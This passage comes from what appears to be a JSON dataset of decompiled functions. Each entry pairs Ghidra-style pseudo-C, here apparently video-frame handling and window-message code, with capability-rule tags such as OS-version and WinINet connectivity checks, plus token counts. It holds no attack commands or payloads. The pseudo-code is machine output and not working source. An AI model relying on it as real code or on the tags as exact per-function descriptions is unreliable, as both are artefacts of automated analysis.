        "decompiled_code": "\nuint32_t __fastcall fcn.00463220(uint param_1, char param_2)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar7;\n    int32_t *piStack60;\n    uint uStack56;\n    uchar *puStack52;\n    int32_t *piStack48;\n    uint uStack44;\n    uint uStack40;\n    int32_t *piStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_5h;\n    \n    if (*(in_EAX + 0x28) == 0) {\n        uStack28 = 0x463243;\n        uStack28 = fcn.0040700c();\n        uStack32 = *0x492298;\n        piStack36 = *(in_EAX + 0x38);\n        uStack40 = 0x463255;\n        iVar3 = (***piStack36)();\n        if (iVar3 != 0) {\n            uStack28 = 0x463264;\n            fcn.0040700c();\n        }\n    }\n    if (*(in_EAX + 0x30) == 0) {\n        uStack28 = 0x463278;\n        uStack28 = fcn.0040700c();\n        uStack32 = *0x492334;\n        piStack36 = *(in_EAX + 0x38);\n        uStack40 = 0x46328a;\n        iVar3 = (***piStack36)();\n        if (iVar3 != 0) {\n            uStack28 = 0x463299;\n            fcn.0040700c();\n        }\n    }\n    uStack28 = 0x4633fc;\n    uStack32 = *(in_EAX + 0x38);\n    piStack36 = *(in_EAX + 0x14);\n    uStack40 = 0x4632b1;\n    uVar4 = (**(*piStack36 + 0xc))();\n    if ((uVar4 & 0x80000000) == 0) {\n        uStack40 = 0x463418;\n        uStack44 = *(in_EAX + 0x24);\n        piStack48 = *(in_EAX + 0x14);\n        puStack52 = 0x4632d7;\n        uVar4 = (**(*piStack48 + 0xc))();\n        if ((uVar4 & 0x80000000) == 0) {\n            if (param_2 == '\\0') {\n                puStack52 = 0x463438;\n                uStack56 = *(in_EAX + 0x2c);\n                piStack60 = *(in_EAX + 0x14);\n                uVar4 = (**(*piStack60 + 0xc))();\n                if ((uVar4 & 0x80000000) != 0) {\n                    return uVar4;\n                }\n            }\n            puStack52 = 0x46331b;\n            puVar5 = fcn.00402f00();\n            puStack52 = 0x463327;\n            puVar6 = fcn.00402f00();\n            puVar2 = *0x492538;\n            puVar1 = *0x492538 + 1;\n            *puVar5 = **0x492538;\n            puVar5[1] = *puVar1;\n            puVar5[2] = puVar2[2];\n            puVar5[3] = puVar2[3];\n            puVar2 = *0x4926a4;\n            puVar1 = *0x4926a4 + 1;\n            *puVar6 = **0x4926a4;\n            puVar6[1] = *puVar1;\n            puVar6[2] = puVar2[2];\n            puVar6[3] = puVar2[3];\n            uStack56 = 0x4633a8;\n            piStack60 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffc4;\n            if (param_2 == '\\0') {\n                piVar7 = *(in_EAX + 0x18);\n                puStack52 = &stack0xfffffffc;\n                uVar4 = (**(*piVar7 + 0x1c))\n                                  (piVar7, puVar5, puVar6, *(in_EAX + 0x38), *(in_EAX + 0x24), *(in_EAX + 0x2c));\n            }\n            else {\n                piVar7 = *(in_EAX + 0x18);\n                puStack52 = &stack0xfffffffc;\n                uVar4 = (**(*piVar7 + 0x1c))(piVar7, puVar5, puVar6, *(in_EAX + 0x38), *(in_EAX + 0x24), 0);\n            }\n            *in_FS_OFFSET = piVar7;\n            if ((uVar4 & 0x80000000) == 0) {\n                if ((param_2 != '\\0') && (uVar4 = fcn.004631d8(),  (uVar4 & 0x80000000) != 0)) {\n                    return uVar4;\n                }\n                uVar4 = (**(**(in_EAX + 0xc) + 0x1c))(*(in_EAX + 0xc));\n                *(in_EAX + 0x1c) = 2;\n            }\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 1257
    },
    "00463460": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463460(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uchar in_CL;\n    int32_t **in_FS_OFFSET;\n    int32_t *piVar2;\n    int32_t *piStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x463476;\n    fcn.004059cc();\n    uStack28 = 0x4634ed;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack24 = &stack0xfffffffc;\n    fcn.0040700c();\n    *(in_EAX + 0x44) = in_CL;\n    piVar2 = *(in_EAX + 0x18);\n    uVar1 = (**(*piVar2 + 0xc))(piVar2, *(in_EAX + 0x14));\n    if ((uVar1 & 0x80000000) == 0) {\n        uVar1 = fcn.00463024(in_EAX + 0x38);\n        if ((uVar1 & 0x80000000) == 0) {\n            fcn.00463740();\n            if (arg_8h != '\\0') {\n                fcn.00463454();\n            }\n        }\n    }\n    *in_FS_OFFSET = piVar2;\n    piStack32 = 0x4634f4;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 350
    },
    "00463500": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00463500(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack304;\n    uint uStack300;\n    uchar *puStack296;\n    uint var_118h;\n    uint var_114h;\n    int32_t var_110h;\n    int32_t *var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    var_8h = NULL;\n    var_ch = NULL;\n    puStack296 = 0x46352b;\n    fcn.00405fe8();\n    uStack300 = 0x46364e;\n    piStack304 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffed0;\n    puStack296 = &stack0xfffffffc;\n    fcn.0040700c();\n    fcn.0040700c();\n    uVar1 = fcn.0040700c();\n    iVar2 = (**(*param_2 + 0x28))(param_2, uVar1);\n    while (iVar2 == 0) {\n        uVar1 = fcn.0040700c(&fcn.00463500::var_118h);\n        iVar2 = (**(*var_4h + 0xc))(var_4h, 1, uVar1);\n        if ((iVar2 == 0) && (var_8h != NULL)) {\n            uVar1 = fcn.0040700c();\n            iVar2 = (**(*var_8h + 0x18))(var_8h, uVar1);\n            if ((iVar2 == 0) && (var_ch != NULL)) {\n                uVar1 = fcn.004060ac();\n                iVar2 = (**(*var_ch + 0x20))(var_ch, uVar1);\n                if ((iVar2 == 0) && (var_110h == 0)) {\n                    fcn.00463500();\n                    (**(**(in_EAX + 0x14) + 0x24))(*(in_EAX + 0x14), var_ch);\n                    (**(**(in_EAX + 0x14) + 0x24))(*(in_EAX + 0x14), var_8h);\n                    (**(**(in_EAX + 0x14) + 0x10))(*(in_EAX + 0x14), var_114h);\n                }\n            }\n        }\n    }\n    *in_FS_OFFSET = param_2;\n    piStack304 = 0x463655;\n    fcn.004060ac();\n    fcn.004060f8();\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 626
    },
    "00463674": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00463674(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x34) != 0) {\n        (**(**(in_EAX + 0x34) + 0x24))(*(in_EAX + 0x34), 0, 1);\n    }\n    if (*(in_EAX + 0xc) != 0) {\n        (**(**(in_EAX + 0xc) + 0x3c))(*(in_EAX + 0xc));\n    }\n    *(in_EAX + 0x1c) = 0;\n    if (*(in_EAX + 0x10) != 0) {\n        (**(**(in_EAX + 0x10) + 0x34))(*(in_EAX + 0x10), 0, 0x8001, 0);\n    }\n    if (*(in_EAX + 8) != 0) {\n        (**(**(in_EAX + 8) + 0x4c))(*(in_EAX + 8), 0);\n        (**(**(in_EAX + 8) + 0x74))(*(in_EAX + 8), 0);\n    }\n    return;\n}\n",
        "token_count": 274
    },
    "004636d4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004636d4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if (*(in_EAX + 0xc) != 0) {\n        if (param_2 == '\\0') {\n            uVar1 = (**(**(in_EAX + 0xc) + 0x24))(*(in_EAX + 0xc));\n            *(in_EAX + 0x1c) = 0;\n        }\n        else if (*(in_EAX + 0x1c) != '\\x02') {\n            uVar1 = (**(**(in_EAX + 0xc) + 0x1c))(*(in_EAX + 0xc));\n            *(in_EAX + 0x1c) = 2;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 200
    },
    "00463740": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00463740(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint *puVar5;\n    uint *in_FS_OFFSET;\n    uint uStack220;\n    uint uStack216;\n    uchar *puStack212;\n    uint var_c0h;\n    uint var_a8h;\n    int32_t *var_28h;\n    int32_t var_24h;\n    uint var_1dh;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    int32_t *var_4h;\n    \n    puStack212 = &stack0xfffffffc;\n    var_4h = NULL;\n    uStack216 = 0x4639e2;\n    uStack220 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff24;\n    fcn.00406928(0);\n    var_8h = fcn.00463708();\n    if (var_8h == 0) {\n        var_8h = (**(*var_4h + 0x14))(var_4h, &fcn.00463740::var_18h, &fcn.00463740::var_1dh + 1);\n    }\n    var_14h = 0;\n    if ((var_8h == 0) && (-1 < var_18h + -1)) {\n        var_24h = var_18h;\n        iVar3 = 0;\n        do {\n            var_ch = &fcn.00463740::var_a8h;\n            var_8h = (**(*var_4h + 0x18))(var_4h, iVar3, &fcn.00463740::var_10h, var_ch);\n            iVar2 = *(var_10h + 0x10);\n            var_28h = var_ch + 5;\n            if (((var_8h & 0x80000000) == 0) &&\n               (((cVar1 = fcn.00462814(),  cVar1 != '\\0' || (iVar2 == 0x47504a4d)) ||\n                ((((iVar2 == 0x32595559 || ((iVar2 == 0x564e5559 || (iVar2 == 0x56595559)))) &&\n                  (*var_28h * var_28h[1] * 2 == *(var_10h + 0x28))) ||\n                 ((((iVar2 == 0x30323449 || (iVar2 == 0x32315659)) || (iVar2 == 0x56555949)) &&\n                  (*var_28h * var_28h[1] * 3 >> 1 == *(var_10h + 0x28))))))))) {\n                fcn.00406928(var_14h + 1);\n                iVar2 = var_14h;\n                *(*(in_EAX + 0x50) + 0xc + var_14h * 0x18) = iVar3;\n                *(*(in_EAX + 0x50) + var_14h * 0x18) = *var_28h;\n                *(*(in_EAX + 0x50) + 4 + var_14h * 0x18) = var_28h[1];\n                *(*(in_EAX + 0x50) + 0x10 + var_14h * 0x18) = var_10h;\n                *(*(in_EAX + 0x50) + 8 + var_14h * 0x18) = *(var_10h + 0x28);\n                cVar1 = fcn.00462814();\n                if (cVar1 == '\\0') {\n                    fcn.004030fc();\n                }\n                else {\n                    *(*(in_EAX + 0x50) + 0x14 + iVar2 * 0x18) = *0x4639f4;\n                }\n                var_14h = var_14h + 1;\n            }\n            iVar3 = iVar3 + 1;\n            var_24h = var_24h + -1;\n        } while (var_24h != 0);\n    }\n    if (1 < var_14h) {\n        do {\n            var_1dh._0_1_ = '\\0';\n            if (-1 < var_14h + -2) {\n                var_24h = var_14h + -1;\n                iVar3 = 0;\n                do {\n                    if ((*(*(in_EAX + 0x50) + 0x18 + iVar3 * 0x18) < *(*(in_EAX + 0x50) + iVar3 * 0x18)) ||\n                       ((*(*(in_EAX + 0x50) + iVar3 * 0x18) == *(*(in_EAX + 0x50) + 0x18 + iVar3 * 0x18) &&\n                        (*(*(in_EAX + 0x50) + 0x1c + iVar3 * 0x18) < *(*(in_EAX + 0x50) + 4 + iVar3 * 0x18))))) {\n                        var_1dh._0_1_ = '\\x01';\n                        puVar4 = *(in_EAX + 0x50) + iVar3 * 0x18;\n                        puVar5 = &fcn.00463740::var_c0h;\n                        for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {\n                            *puVar5 = *puVar4;\n                            puVar4 = puVar4 + 1;\n                            puVar5 = puVar5 + 1;\n                        }\n                        puVar4 = *(in_EAX + 0x50) + 0x18 + iVar3 * 0x18;\n                        puVar5 = *(in_EAX + 0x50) + iVar3 * 0x18;\n                        for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {\n                            *puVar5 = *puVar4;\n                            puVar4 = puVar4 + 1;\n                            puVar5 = puVar5 + 1;\n                        }\n                        puVar4 = &fcn.00463740::var_c0h;\n                        puVar5 = *(in_EAX + 0x50) + 0x18 + iVar3 * 0x18;\n                        for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {\n                            *puVar5 = *puVar4;\n                            puVar4 = puVar4 + 1;\n                            puVar5 = puVar5 + 1;\n                        }\n                    }\n                    iVar3 = iVar3 + 1;\n                    var_24h = var_24h + -1;\n                } while (var_24h != 0);\n            }\n        } while (var_1dh != '\\0');\n    }\n    *in_FS_OFFSET = uStack220;\n    puStack212 = 0x4639e9;\n    uStack216 = 0x4639e1;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 1632
    },
    "00463d8c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00463d8c(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar2 = (*(in_EAX + 0x2c) + 1U) % *(in_EAX + 0x30);\n    puStack28 = 0x463dc5;\n    (****(*(in_EAX + 0x28) + 0x1c + uVar2 * 0x20))();\n    uStack32 = 0x463e75;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *(in_EAX + 0xc) = *(in_EAX + 0xc) + 1;\n    iVar1 = *(in_EAX + 0x28) + uVar2 * 0x20;\n    puStack28 = &stack0xfffffffc;\n    if (*param_1 != *(iVar1 + 4)) {\n        *(iVar1 + 4) = *param_1;\n        puStack28 = &stack0xfffffffc;\n        fcn.00402f34();\n    }\n    *(iVar1 + 8) = *(in_EAX + 0x18);\n    *(iVar1 + 0xc) = *(in_EAX + 0x1c);\n    if (*(in_EAX + 0xb) == '\\0') {\n        *(iVar1 + 0x10) = *(in_EAX + 0x20);\n    }\n    else {\n        *(iVar1 + 0x10) = 0;\n    }\n    *(iVar1 + 0x18) = 0;\n    fcn.004030fc();\n    *(in_EAX + 0x2c) = uVar2;\n    fcn.0042eda4();\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x463e7c;\n    uStack32 = 0x463e74;\n    (**(**(*(in_EAX + 0x28) + 0x1c + uVar2 * 0x20) + 4))();\n    return;\n}\n",
        "token_count": 527
    },
    "00463ec0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00463ec0(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack32;\n    int32_t iStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    iStack32 = *param_2;\n    if (iStack32 == *(in_EAX + 0x38)) {\n        iStack28 = 0x463f3a;\n        iStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &iStack32;\n        if (*(in_EAX + 10) == '\\0') {\n            *(in_EAX + 10) = 1;\n            fcn.00464888();\n            if (*(in_EAX + 0x42) != 0) {\n                (**(in_EAX + 0x40))();\n            }\n            *(in_EAX + 10) = 0;\n        }\n        *in_FS_OFFSET = iStack32;\n    }\n    else {\n        puStack24 = param_2[2];\n        iStack28 = param_2[1];\n        iVar1 = sub.user32.dll_DefWindowProcA(*(in_EAX + 0x34));\n        param_2[3] = iVar1;\n    }\n    return;\n}\n",
        "token_count": 312
    },
    "00463f7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00463f7c(void)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    iVar3 = *(in_EAX + 0x30);\n    if (-1 < iVar3 + -1) {\n        iVar4 = 0;\n        do {\n            piVar1 = *(in_EAX + 0x28) + iVar4 * 0x20;\n            if ((0 < piVar1[1]) && (*piVar1 != 0)) {\n                fcn.00402f1c();\n            }\n            if (piVar1[5] != 0) {\n                fcn.00404650();\n            }\n            if (piVar1[7] != 0) {\n                fcn.00404650();\n            }\n            iVar2 = fcn.0042edbc();\n            piVar1[7] = iVar2;\n            *piVar1 = 0;\n            piVar1[1] = 0;\n            piVar1[5] = 0;\n            piVar1[2] = 0;\n            piVar1[3] = 0;\n            *(piVar1 + 6) = 0;\n            iVar4 = iVar4 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 318
    },
    "00464210": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00464210(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    char cVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar4;\n    uint *arg_8h;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack52 = 0x46422f;\n    var_ch = in_EAX;\n    var_4h = param_2;\n    fcn.004059cc();\n    uStack56 = 0x4643a2;\n    iStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    *(var_ch + 0xc) = 0;\n    *(var_ch + 0x10) = 0;\n    *(var_ch + 0x14) = 0;\n    puStack52 = &stack0xfffffffc;\n    fcn.00405530();\n    if (*(var_ch + 4) != 0) {\n        fcn.00464194();\n    }\n    if (var_10h < -1) {\n        var_10h = -1;\n    }\n    *(var_ch + 0xb) = var_10h == -1;\n    uVar1 = fcn.00462b0c(&fcn.00464210::var_14h, 0, var_10h == -1);\n    *(var_ch + 4) = uVar1;\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffac;\n    iVar4 = 1;\n    uVar2 = fcn.00463460(1, &fcn.00464210::var_8h);\n    cVar3 = '\\x01' - ((uVar2 & 0x80000000) != 0);\n    *in_FS_OFFSET = iVar4;\n    if (cVar3 != '\\0') {\n        if (var_10h == -1) {\n            arg_8h = &fcn.00464210::var_20h;\n            uVar2 = fcn.00463ad4(arg_8h);\n            if ((uVar2 & 0x80000000) == 0) {\n                *(var_ch + 0x18) = var_18h;\n                *(var_ch + 0x1c) = var_1ch;\n                *(var_ch + 0x20) = var_20h;\n            }\n            else {\n                cVar3 = '\\0';\n            }\n        }\n        else {\n            arg_8h = 0x464308;\n            cVar3 = fcn.00464c64();\n        }\n    }\n    if (cVar3 == '\\0') {\n        fcn.00464194();\n    }\n    else {\n        *(var_ch + 9) = 1;\n        fcn.00405584();\n        fcn.00463c20(fcn.00463d8c, var_ch);\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 765
    },
    "004643b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004643b4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0x1c4b) == '\\0') {\n        iVar2 = 0;\n        do {\n            uVar1 = fcn.00403450(iVar2);\n            *(in_EAX + 0x4c + iVar2 * 4) = uVar1;\n            uVar1 = fcn.00403450(iVar2);\n            *(in_EAX + 0x44c + iVar2 * 4) = uVar1;\n            uVar1 = fcn.00403450(iVar2);\n            *(in_EAX + 0x84c + iVar2 * 4) = uVar1;\n            uVar1 = fcn.00403450(iVar2);\n            *(in_EAX + 0xc4c + iVar2 * 4) = uVar1;\n            uVar1 = fcn.00403450(iVar2);\n            *(in_EAX + 0x104c + iVar2 * 4) = uVar1;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 != 0x100);\n        fcn.00403af4();\n        iVar2 = 0;\n        do {\n            *(in_EAX + 0x184b + iVar2) = iVar2;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 != 0x100);\n        iVar2 = 0x100;\n        do {\n            *(in_EAX + 0x184b + iVar2) = 0xff;\n            iVar2 = iVar2 + 1;\n        } while (iVar2 != 0x400);\n        *(in_EAX + 0x1c4b) = 1;\n    }\n    return;\n}\n",
        "token_count": 414
    },
    "00464888": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00464888(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint uStack20;\n    uint uStack16;\n    uchar *puStack12;\n    int32_t var_4h;\n    \n    if (*(in_EAX + 0x24) != 0) {\n        puStack12 = 0x4648b3;\n        var_4h = in_EAX;\n        fcn.0046491c();\n        if (*(*(var_4h + 0x24) + 0x50) < 1) {\n            puStack12 = 0x4648c4;\n            fcn.00425350();\n            uStack16 = 0x46490f;\n            uStack20 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffec;\n            arg_8h = *(*(var_4h + 0x28) + 0x14 + *(var_4h + 0x2c) * 0x20);\n            puStack12 = &stack0xfffffffc;\n            fcn.00425230(arg_8h);\n            *in_FS_OFFSET = arg_8h;\n            uStack16 = 0x464916;\n            uStack20 = 0x46490e;\n            fcn.00425588();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 309
    },
    "0046491c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046491c(uint param_1, int32_t *param_2)\n\n{\n    uint32_t uVar1;\n    bool bVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uint uVar5;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_5h;\n    \n    uStack44 = 0x464b33;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if ((*(param_2 + 6) != '\\0') || (*param_2 == 0)) goto code_r0x00464b18;\n    if (param_2[5] == 0) {\n        iVar3 = fcn.0042935c();\n        param_2[5] = iVar3;\n    }\n    iVar3 = (**(*param_2[5] + 0x2c))();\n    if ((iVar3 != param_2[2]) || (iVar3 = (**(*param_2[5] + 0x20))(),  iVar3 != param_2[3])) {\n        fcn.0042a8b0();\n        (**(*param_2[5] + 0x40))();\n        (**(*param_2[5] + 0x34))();\n    }\n    bVar2 = false;\n    uVar5 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    iVar3 = param_2[4];\n    if (iVar3 < 0x3259555a) {\n        if (iVar3 == 0x32595559) goto code_r0x00464a15;\n        if (iVar3 == 0) {\n            if (param_2[2] * param_2[3] * 3 == param_2[1]) {\n                fcn.00429aa0();\n                fcn.004030fc();\n            }\n            else {\n                bVar2 = true;\n            }\n        }\n        else {\n            if ((iVar3 == 0x30323449) || (iVar3 == 0x32315659)) goto code_r0x00464a34;\ncode_r0x00464a5b:\n            bVar2 = true;\n        }\n    }\n    else {\n        if (iVar3 != 0x564e5559) {\n            if (iVar3 == 0x56555949) {\ncode_r0x00464a34:\n                uVar1 = param_2[2] * param_2[3] * 3;\n                iVar3 = uVar1 >> 1;\n                if (iVar3 < 0) {\n                    iVar3 = iVar3 + ((uVar1 & 1) != 0);\n                }\n                if (iVar3 == param_2[1]) {\n                    fcn.00464514();\n                }\n                else {\n                    bVar2 = true;\n                }\n                goto code_r0x00464a5d;\n            }\n            if (iVar3 != 0x56595559) goto code_r0x00464a5b;\n        }\ncode_r0x00464a15:\n        if (param_2[2] * param_2[3] * 2 == param_2[1]) {\n            fcn.0046470c();\n        }\n        else {\n            bVar2 = true;\n        }\n    }\ncode_r0x00464a5d:\n    if (bVar2) {\n        if (param_2[4] != 0) {\n            fcn.004030fc();\n        }\n        uVar5 = 0x464b54;\n        uStack44 = 0x464a9d;\n        fcn.00429930();\n        uStack44 = 0x464aa6;\n        fcn.0042540c(uVar5);\n        uStack44 = 0x464b70;\n        uStack48 = 0x464ab6;\n        fcn.00409d60();\n        uStack48 = 0;\n        fcn.00405794();\n        fcn.004058e0();\n        uVar5 = 0;\n        fcn.00429930();\n        uVar4 = fcn.0042550c();\n        fcn.00429930(uVar4);\n        fcn.0042540c(uVar5);\n    }\n    *(param_2 + 6) = 1;\n    *in_FS_OFFSET = uVar5;\ncode_r0x00464b18:\n    *in_FS_OFFSET = uStack48;\n    uStack44 = 0x464b32;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1045
    },
    "00464b9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00464b9c(int32_t param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_1h;\n    \n    var_1h._0_1_ = 0;\n    piVar1 = *(in_EAX + 0x28) + param_1 * 0x20;\n    puStack28 = 0x464bc8;\n    (***piVar1[7])();\n    uStack32 = 0x464c3f;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if ((((*piVar1 != 0) && (0 < piVar1[2])) && (0 < piVar1[3])) && (0 < piVar1[1])) {\n        puStack28 = &fcn.00464b9c::var_1h + 1;\n        fcn.0046491c();\n        if (*(piVar1 + 6) != '\\0') {\n            (**(*param_2 + 8))();\n            var_1h._0_1_ = 1;\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x464c46;\n    uStack32 = 0x464c3e;\n    (**(*piVar1[7] + 4))();\n    return;\n}\n",
        "token_count": 378
    },
    "00464c64": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
